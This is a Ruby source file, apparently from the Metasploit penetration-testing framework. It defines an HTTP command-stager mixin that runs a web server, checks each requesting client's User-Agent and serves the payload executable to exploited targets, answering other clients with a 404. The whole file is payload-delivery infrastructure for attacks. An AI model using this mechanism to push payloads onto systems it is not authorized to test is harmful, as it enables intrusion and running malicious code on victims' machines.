# -*- coding: binary -*-

module Msf::Exploit::CmdStager
module HTTP

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Stance' => Msf::Exploit::Stance::Aggressive
    ))
  end

  def cmdstager_start_service(opts = {})
    # XXX: This is a workaround until we can take SSL in opts
    datastore_ssl = datastore['SSL']
    datastore['SSL'] = !!opts[:ssl]

    opts['Uri'] = {
      'Proc' => Proc.new { |cli, req| cmdstager_on_request_uri(cli, req) },
      'Path' => opts['Path'] || resource_uri
    }.update(opts['Uri'] || {})
    start_service(opts)

    payload_uri = get_uri
    datastore['SSL'] = datastore_ssl

    payload_uri
  end

  def cmdstager_on_request_uri(cli, request)
    client = cli.peerhost

    if (user_agent = request.headers['User-Agent'])
      client << " (#{user_agent})"
    end

    print_status("Client #{client} requested #{request.uri}")

    # NOTE: stager_instance is from Msf::Exploit::CmdStager
    if stager_instance.respond_to?(:user_agent)
      agent_regex = stager_instance.user_agent
    else
      agent_regex = /.*/
    end

    unless user_agent =~ agent_regex
      print_status("Sending 404 to #{client}")
      return send_not_found(cli)
    end

    print_status("Sending payload to #{client}")
    send_response(cli, exe) # NOTE: exe is from Msf::Exploit::CmdStager
  end

end
end
